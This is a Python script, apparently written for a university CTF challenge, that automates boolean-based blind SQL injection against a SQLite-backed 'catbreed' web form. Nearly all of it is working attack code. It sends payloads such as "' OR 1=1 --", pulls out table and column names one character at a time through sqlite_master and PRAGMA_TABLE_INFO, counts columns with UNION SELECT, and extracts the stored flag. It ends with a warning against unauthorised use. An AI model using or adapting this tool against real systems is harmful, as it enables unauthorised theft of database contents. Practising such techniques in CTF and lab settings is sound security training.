'''
Author: 0x4F776C
GitHub: https://github.com/0x4F776C/Structured-Query-Language/tree/main/scripts/SQLite

Note: perform a "pip install -r requirements.txt" to install all required imports before executing script
'''

import argparse
import textwrap
import requests
import re

#url = 'http://127.0.0.1:8889/'
url = 'http://cs2107-ctfd-i.comp.nus.edu.sg:8083/'
post_form = 'catbreed'
headers = {
        'referrer': url + post_form,
        'Connection': 'keep-alive',
        'Host': url
}
success_regex = 'Cat breed exists!'

def testSqli():
    print('[*] Start...')

    data = {
        'breed': "' OR 1=1 --"
    }

    response = requests.post(url + post_form, headers=headers, data=data)
    match = re.search(success_regex, response.text)

    print(match)
    print('[!] Completed!')

def getTableName(end_offset, est_table_count):
    table_dirty = []
    table_clean = []

    print('[*] Start...')

    if (int(est_table_count) == 0):
        print('You think you funny?')
        exit
    elif (int(est_table_count) == 1):
        limit = '1'
        for offset in range(0, int(end_offset)):
            for dec_number in range(32, 127):
                data = {
                    'breed': "' OR UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT " + limit + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
                }

                response = requests.post(url + post_form, headers=headers, data=data)
                match = re.search(success_regex, response.text)

                if match:
                    table_dirty.append(dec_number - 1)
                    break

        for char in table_dirty:
            table_clean.append(chr(char))

        delimiter = ''
        print(delimiter.join(table_clean))
        print('[!] Completed!')
    else:
        for i in range(0, int(est_table_count)):
            limit = ', 1'

            for offset in range(1, int(end_offset)):
                for dec_number in range(32, 127):
                    data = {
                        'breed': "' OR UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1" + limit * i + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
                    }

                    response = requests.post(url + post_form, headers=headers, data=data)
                    match = re.search(success_regex, response.text)

                    if match:
                        if (offset == 1):
                            table_dirty.append('|')
                            table_dirty.append(dec_number - 1)
                            break
                        else:
                            table_dirty.append(dec_number - 1)
                            break

        for char in table_dirty:
            if (char == '|'):
                table_clean.append(char)
                continue
            else:
                table_clean.append(chr(char))

        delimiter = ''

        print(delimiter.join(table_clean))
        print('[!] Completed!')

def getColumnsName(table_name, end_offset, est_column_count):
    print('[*] Start...')

    column_dirty = []
    column_clean = []

    if (int(est_column_count) == 0):
        print('You think you funny?')
        exit
    elif (int(est_column_count) == 1):
        limit = '1'
        for offset in range(0, int(end_offset)):
            for dec_number in range(32, 127):
                data = {
                    'breed': "' OR UNICODE(SUBSTR((SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "') LIMIT " + limit + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
                }

                response = requests.post(url + post_form, headers=headers, data=data)
                match = re.search(success_regex, response.text)

                if match:
                    column_dirty.append(dec_number - 1)
                    break

        for char in column_dirty:
            column_clean.append(chr(char))

        delimiter = ''
        print(delimiter.join(column_clean))
        print('[!] Completed!')
    else:
        for i in range(0, int(est_column_count)):
            limit = ', 1'

            for offset in range(1, int(end_offset)):
                    for dec_number in range(32, 127):
                        data = {
                            'breed': "' OR UNICODE(SUBSTR((SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "') LIMIT 1" + limit * i + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
                        }

                        response = requests.post(url + post_form, headers=headers, data=data)
                        match = re.search(success_regex, response.text)

                        if match:
                            if (offset == 1):
                                column_dirty.append('|')
                                column_dirty.append(dec_number - 1)
                                break
                            else:
                                column_dirty.append(dec_number - 1)
                                break

        for char in column_dirty:
            if (char == '|'):
                column_clean.append(char)
                continue
            else:
                column_clean.append(chr(char))

        delimiter = ''

        print(delimiter.join(column_clean))
        print('[!] Completed!')

def getColumns(null_count, db_name):
    print('[*] Start...')

    for i in range(0, int(null_count)):
        null = "NULL"
        if (i == 0):
            data = {
                "breed": "' UNION SELECT " + null + " FROM " + db_name + " WHERE type='table' --"
            }
        else:
            null += ", NULL"
            data = {
                "breed": "' UNION SELECT " + null * i + " FROM " + db_name + " WHERE type='table' --"
            }

        response = requests.post(url + post_form, headers=headers, data=data)
        match = re.search(success_regex, response.text)

        if (match):
            i = i + 1
            print(f"Number of columns in {db_name}: {i}")
            print('[!] Completed!')

def getFlag(table_name, end_offset):
    print('[*] Start...')

    flag_dirty = []
    flag_clean = []

    for offset in range(1, int(end_offset)):
        for dec_number in range(32, 127):
            data = {
                    'breed': "' OR UNICODE(SUBSTR((SELECT " + table_name[:-1] + " FROM " + table_name + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
            }

            response = requests.post(url + post_form, headers=headers, data=data)
            match = re.search(success_regex, response.text)

            if match:
                flag_dirty.append(dec_number - 1)
                break

    for flag in flag_dirty:
        flag_clean.append(chr(flag))

    delimiter = ''
    print(delimiter.join(flag_clean))
    print('[!] Completed!')

def choice(option):
    if option == '1':
        testSqli()
    elif option == '2':
        end_offset = input('Ending offset of the table name: ')
        est_table_count = input('Guesstimate number of tables: ')
        getTableName(end_offset=end_offset, est_table_count=est_table_count)
    elif option == '3':
        table_name = input('Table name: ')
        end_offset = input('Ending offset of the column name: ')
        est_column_count = input("Guesstimate number of columns: ")
        getColumnsName(table_name=table_name, end_offset=end_offset, est_column_count=est_column_count)
    elif option == '4':
        null_count = input('Number of NULLs expected: ')
        db_name =  input('Database name: ')
        getColumns(null_count=null_count, db_name=db_name)
    elif option == '5':
        table_name = input('Table name: ')
        end_offset = input('Ending offset of the flag: ')
        getFlag(table_name=table_name, end_offset=end_offset)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='SQLinjector',
        description=textwrap.dedent('''
            SQLite SQL injection tool for pentesting/red-teaming/CTF challenge

            Example:
                python %(prog)s 4 4 sqlite_master
                python %(prog)s 5 flags

        '''),
        usage='use "python %(prog)s -h" for more information',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='DO NOT USE AGAINST UNAUTHORISED SYSTEM(S)'
    )

    parser.add_argument(
        '--argument',
        help=textwrap.dedent('''
            1 - Vulnerability test (no argument needed)
            2 - Get table name (requires end_offset, est_table_count)
            3 - Get column name (requires table_name, end_offset, est_column_count)
            4 - Get number of columns (requires null_count, db_name)
            5 - Get flag (requires table_name, end_offset)
        '''),
        required=True
        )

    args = parser.parse_args()

    choice(args.argument)
